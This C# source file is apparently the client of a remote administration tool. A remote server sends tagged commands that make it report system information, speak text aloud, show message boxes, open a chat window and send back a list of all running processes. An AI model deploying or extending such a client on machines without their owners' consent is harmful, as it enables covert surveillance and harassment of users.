using Clients.Forms;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Clients.Connection
{
    class CommandReaderClient : EasyCommand
    {
        public static void DataProcess(string tag, byte[] dataBuff)
        {
            Program.chat = new Forms.FormChat();
            try
            {
                string text = System.Text.Encoding.UTF8.GetString(dataBuff);
                byte[] data;
                switch (tag.Split('|')[0])
                {
                    case "<ID>":
                        int id = int.Parse(System.Text.Encoding.UTF8.GetString(dataBuff));
                        Console.WriteLine(tag);
                        Console.WriteLine(text);
                        data = Connection.MyDataPacker("INFO", GetClientInfo.ClientInfo(id));
                        Connection.Send(data);
                        break;
                    case "<T2S>":
                        Console.WriteLine(tag);
                        Console.WriteLine(text);
                        T2S(text);
                        break;
                    case "<MSGBOX>":
                        Console.WriteLine(tag);
                        MsgBox(text);
                        Console.WriteLine(text);
                        break;
                    case "<OPENCHAT>":
                        Console.WriteLine(tag);
                        Program.chat.ShowDialog();
                        break;
                    case "<MSG>":
                        Console.WriteLine(tag);
                        Console.WriteLine(text);
                        Program.chat.DataProcess(text);
                        break;
                    case "<TSK>":
                        Console.WriteLine(tag);
                        Console.WriteLine(text);
                        TaskManager();
                        break;

                }
            }
            catch { }
        }


    }


    public class EasyCommand
    {
        public static void T2S(string text)
        {
            try
            {
                System.Speech.Synthesis.SpeechSynthesizer synth = new System.Speech.Synthesis.SpeechSynthesizer();
                synth.SetOutputToDefaultAudioDevice();
                synth.Speak(text);
                /*byte[] data = Connection.MyDataPacker("SCCS", System.Text.Encoding.UTF8.GetBytes("Command Successfully completed"));
                Connection.Send(data);*/
            }
            catch
            {
                byte[] data = Connection.MyDataPacker("NSCCS", System.Text.Encoding.UTF8.GetBytes("Command Error"));
                Connection.Send(data);
            }
        }


        public static void MsgBox(string text)
        {
            try
            {
                string[] lines = text.Split(new string[] {"[KORGI]"}, StringSplitOptions.None);
                string title = lines[0];
                string body = lines[1];
                MessageBoxButtons buttons = MessageBoxButtons.OK;
                MessageBoxIcon ico = MessageBoxIcon.None;

                switch (lines[2])
                {
                    case "Error":
                        ico = MessageBoxIcon.Error;
                        break;
                    case "None":
                        //None
                        ico = MessageBoxIcon.None;
                        break;
                    case "Warning":
                        //Warning
                        ico = MessageBoxIcon.Warning;
                        break;
                    case "Information":
                        //Information
                        ico = MessageBoxIcon.Information;
                        break;
                    case "Question":
                        //Question
                        ico = MessageBoxIcon.Question;
                        break;
                    case "Hand":
                        //Hand
                        ico = MessageBoxIcon.Hand;
                        break;
                    case "Stop":
                        //Stop
                        ico = MessageBoxIcon.Stop;
                        break;
                }
                switch (lines[3])
                {
                    case "OK":
                        //OK
                        buttons = MessageBoxButtons.OK;
                        break;
                    case "YesNo":
                        //YesNo
                        buttons = MessageBoxButtons.YesNo;
                        break;
                    case "YesNoCancel":
                        //YesNoCancel
                        buttons = MessageBoxButtons.YesNoCancel;
                        break;
                    case "AbortRetryIgnore":
                        //AbortRetryIgnore
                        buttons = MessageBoxButtons.AbortRetryIgnore;
                        break;
                    case "OKCancel":
                        //OKCancel
                        buttons = MessageBoxButtons.OKCancel;
                        break;
                }
                MessageBox.Show(title, body, buttons, ico);
                byte[] data = Connection.MyDataPacker("SCCS", System.Text.Encoding.UTF8.GetBytes("Command Successfully completed"));
                Connection.Send(data);
            }
            catch 
            {
                byte[] data = Connection.MyDataPacker("NSCCS", System.Text.Encoding.UTF8.GetBytes("Command Error"));
                Connection.Send(data);
            }
        }


        public static void TaskManager()
        {
            string data = "", sep = "[KORGI]";
            Process[] proc = Process.GetProcesses();

            foreach (Process p in proc)
            {
                try
                {
                    string name = p.ProcessName;
                    string id = p.Id.ToString();

                    if (string.IsNullOrEmpty(name)) name = "N/A";
                    if (string.IsNullOrEmpty(id)) id = "N/A";
                    data += name + sep + id + "[KORGIZ]";
                }
                catch (Exception) { }
            }

            //byte[] datas = Encoding.UTF8.GetBytes(data);
            byte[] datas = Connection.MyDataPacker("TSK", Encoding.UTF8.GetBytes(data));
            Connection.Send(datas);
        }
    }
}
